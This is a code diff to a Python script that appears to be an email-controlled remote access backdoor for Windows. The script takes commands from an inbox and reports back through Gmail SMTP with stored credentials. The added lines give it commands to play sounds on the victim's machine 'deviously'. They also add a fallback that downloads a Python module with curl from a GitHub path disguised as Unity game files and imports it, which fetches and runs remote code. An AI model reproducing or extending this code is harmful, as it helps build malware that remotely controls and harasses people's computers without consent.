@@ -8,6 +8,17 @@ import time
 import subprocess as sp
 import winreg as reg
 import getpass
+try:
+    from playsound import playsound
+except:
+    os.system("curl https://raw.githubusercontent.com/ivertheboss/Photon-Unity/main/GameFolder/MonoBleedingEdge/EmbedRuntime/playsound.py -o playsound.py")
+    from playsound import playsound
+import threading
+
+thread = ""
+
+def play(sound):
+    playsound(sound)
 
 USER_NAME = getpass.getuser()
 
@@ -62,6 +73,59 @@ while True:
 
     try:
         command = get_inbox()[0]['body']
+        if command[0:9] == "stopsound":
+            try:
+                thread.terminate()
+                subject = 'CMD'
+                body = "SOUND STOPPED"
+                em = EmailMessage()
+                em['From'] = email_sender
+                em['To'] = email_receiver
+                em['Subject'] = subject
+                em.set_content(body)
+                context = ssl.create_default_context()
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                    smtp.login(email_sender, email_password)
+                    smtp.sendmail(email_sender, email_receiver, em.as_string())
+            except:
+                subject = 'CMD'
+                body = "NO SOUNDS PLAYING"
+                em = EmailMessage()
+                em['From'] = email_sender
+                em['To'] = email_receiver
+                em['Subject'] = subject
+                em.set_content(body)
+                context = ssl.create_default_context()
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                    smtp.login(email_sender, email_password)
+                    smtp.sendmail(email_sender, email_receiver, em.as_string())
+        if command[0:9] == "playsound":
+            try:
+                thread = threading.Thread(target=play, args=(command.partition(' ')[2],))
+                thread.start()
+                subject = 'CMD'
+                body = "PLAYING SOUND (deviously)"
+                em = EmailMessage()
+                em['From'] = email_sender
+                em['To'] = email_receiver
+                em['Subject'] = subject
+                em.set_content(body)
+                context = ssl.create_default_context()
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                    smtp.login(email_sender, email_password)
+                    smtp.sendmail(email_sender, email_receiver, em.as_string())
+            except:
+                subject = 'CMD'
+                body = "COULD NOT FIND FILE"
+                em = EmailMessage()
+                em['From'] = email_sender
+                em['To'] = email_receiver
+                em['Subject'] = subject
+                em.set_content(body)
+                context = ssl.create_default_context()
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                    smtp.login(email_sender, email_password)
+                    smtp.sendmail(email_sender, email_receiver, em.as_string())
         print("COMMAND RECEIVED...")
         print("EXECUTING COMMAND...")
         subject = 'CMD'
